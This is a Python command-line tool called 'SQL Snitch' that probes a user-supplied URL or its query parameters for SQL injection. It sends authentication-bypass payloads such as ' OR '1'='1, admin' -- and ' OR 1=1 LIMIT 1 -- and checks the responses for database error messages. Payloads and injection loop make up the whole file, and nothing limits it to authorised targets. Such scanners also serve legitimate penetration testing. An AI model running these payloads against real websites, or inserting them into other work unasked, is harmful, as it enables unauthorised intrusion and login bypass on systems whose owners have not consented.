import requests
import re
import os
from urllib.parse import urljoin
from tqdm import tqdm
import time

# ASCII Art Intro
def display_intro():
    ascii_art = r"""

███████╗ ██████╗ ██╗         ███████╗███╗   ██╗██╗████████╗ ██████╗██╗  ██╗
██╔════╝██╔═══██╗██║         ██╔════╝████╗  ██║██║╚══██╔══╝██╔════╝██║  ██║
███████╗██║   ██║██║         ███████╗██╔██╗ ██║██║   ██║   ██║     ███████║
╚════██║██║▄▄ ██║██║         ╚════██║██║╚██╗██║██║   ██║   ██║     ██╔══██║
███████║╚██████╔╝███████╗    ███████║██║ ╚████║██║   ██║   ╚██████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚══════╝╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                                           


    SQL Snitch
    Created by Noah Bank v1
    """
    print(ascii_art)

# SQL Injection Tester Class
class SQLInjectionScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.payloads = {
            "light": [
                "' OR '1'='1",  # Simple bypass
                "\" OR \"1\"=\"1",  # Double quote bypass
            ],
            "deep": [
                "' OR '1'='1",  # Simple bypass
                "\" OR \"1\"=\"1",  # Double quote bypass
                "' OR '1'='1' -- ",  # Comment bypass
                "' OR 1=1#",
            ],
            "full": [
                "' OR '1'='1",  # Simple bypass
                "\" OR \"1\"=\"1",  # Double quote bypass
                "' OR '1'='1' -- ",  # Comment bypass
                "' OR 1=1#",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' OR 1=1 LIMIT 1 -- ",
            ]
        }

    def scan_url(self, url, scan_type):
        """Scan a single URL for vulnerabilities."""
        print(f"Scanning {url} with {scan_type} scan...")
        payloads = self.payloads[scan_type]
        total_payloads = len(payloads)
        start_time = time.time()
        with tqdm(total=total_payloads, desc="Scan Progress", unit="payload", ncols=100) as progress_bar:
            for i, payload in enumerate(payloads):
                injected_url = f"{url}{payload}"
                try:
                    response = requests.get(injected_url, timeout=5)
                    if self.is_vulnerable(response.text):
                        print(f"[!] Vulnerability found with payload: {payload}")
                        self.go_back_to_menu()
                        return
                except requests.RequestException as e:
                    print(f"[!] Error: {e}")
                progress_bar.update(1)
                elapsed_time = time.time() - start_time
                estimated_total_time = (elapsed_time / (i + 1)) * total_payloads
                remaining_time = estimated_total_time - elapsed_time
                progress_bar.set_postfix({"ETA": f"{remaining_time:.2f}s"})
        print("[-] No vulnerabilities found.")
        self.go_back_to_menu()

    def is_vulnerable(self, response_content):
        """Check if the response indicates a vulnerability."""
        error_messages = [
            "You have an error in your SQL syntax;",
            "Warning: mysql_",
            "Unclosed quotation mark after the character string",
            "quoted string not properly terminated"
        ]
        for error in error_messages:
            if error.lower() in response_content.lower():
                return True
        return False

    def scan_params(self, url, params, scan_type):
        """Scan a URL with parameters for vulnerabilities."""
        print(f"Scanning {url} with parameters: {params} using {scan_type} scan...")
        payloads = self.payloads[scan_type]
        total_payloads = len(payloads) * len(params.keys())
        start_time = time.time()
        counter = 0
        with tqdm(total=total_payloads, desc="Scan Progress", unit="payload", ncols=100) as progress_bar:
            for key in params.keys():
                original_value = params[key]
                for payload in payloads:
                    counter += 1
                    params[key] = payload
                    try:
                        response = requests.get(url, params=params, timeout=5)
                        if self.is_vulnerable(response.text):
                            print(f"[!] Vulnerability found in parameter '{key}' with payload: {payload}")
                            self.go_back_to_menu()
                            return
                    except requests.RequestException as e:
                        print(f"[!] Error: {e}")
                    finally:
                        params[key] = original_value
                    progress_bar.update(1)
                    elapsed_time = time.time() - start_time
                    estimated_total_time = (elapsed_time / counter) * total_payloads
                    remaining_time = estimated_total_time - elapsed_time
                    progress_bar.set_postfix({"ETA": f"{remaining_time:.2f}s"})
        print("[-] No vulnerabilities found.")
        self.go_back_to_menu()

    def go_back_to_menu(self):
        """Prompt the user to go back to the menu."""
        input("Press Enter to return to the main menu.")
        main()

# Main Function
def main():
    display_intro()
    base_url = input("Enter the base URL to scan: ").strip()
    scan_type = input("Choose scan type (light, deep, full): ").strip().lower()
    while scan_type not in ["light", "deep", "full"]:
        print("Invalid choice. Please choose 'light', 'deep', or 'full'.")
        scan_type = input("Choose scan type (light, deep, full): ").strip().lower()

    params_input = input("Enter parameters in key=value format (comma-separated) or leave blank: ").strip()

    scanner = SQLInjectionScanner(base_url)

    if params_input:
        params = dict(param.split('=') for param in params_input.split(','))
        scanner.scan_params(base_url, params, scan_type)
    else:
        print("[!] No parameters provided. Using recommended parameters...")
        scanner.scan_url(base_url, scan_type)

if __name__ == "__main__":
    main()
